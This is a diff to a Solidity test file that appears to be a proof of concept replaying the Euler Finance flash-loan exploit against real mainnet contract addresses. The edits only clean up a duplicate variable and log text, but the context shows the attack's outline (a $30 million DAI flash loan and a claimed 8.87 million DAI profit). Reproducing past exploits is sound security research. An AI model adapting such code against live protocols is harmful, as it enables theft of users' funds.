@@ -16,7 +16,6 @@ import { IRiskManager } from "euler-contracts/contracts/IRiskManager.sol";
 
 contract EulerFinancePoC is Test {
     IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
-    IERC20 DAI;
     IEToken constant eToken = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
     // address eTokenImpl = address(0xeC29b4C2CaCaE5dF1A491f084E5Ec7C62A7EdAb5);
     IMarkets constant MARKETS = IMarkets(0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3);
@@ -40,9 +39,7 @@ contract EulerFinancePoC is Test {
     }
 
     function testExploit() public {
-
-        DAI = DAI;
-        console.log("Attacker balance before exploit", DAI.balanceOf(address(this))/1e18, IERC20(DAI).symbol());
+        console.log("Attacker balance before exploit:", DAI.balanceOf(address(this))/1e18, IERC20(DAI).symbol());
         console.log(" ");
         // 1. Flash loan $30 million DAI
         uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
@@ -68,7 +65,7 @@ contract EulerFinancePoC is Test {
         // 10. attacker's balance > 30 million DAI borrowed + 27k DAI interest => loan repaid successfully automatically (else flashLoan would revert)
 
         // 8.87 million DAI profit!
-        console.log("Attacker balance after exploit", DAI.balanceOf(address(this)) / 1e18, IERC20(DAI).symbol());
+        console.log("Attacker balance after exploit:", DAI.balanceOf(address(this)) / 1e18, IERC20(DAI).symbol());
         console.log(" ");
     }
 
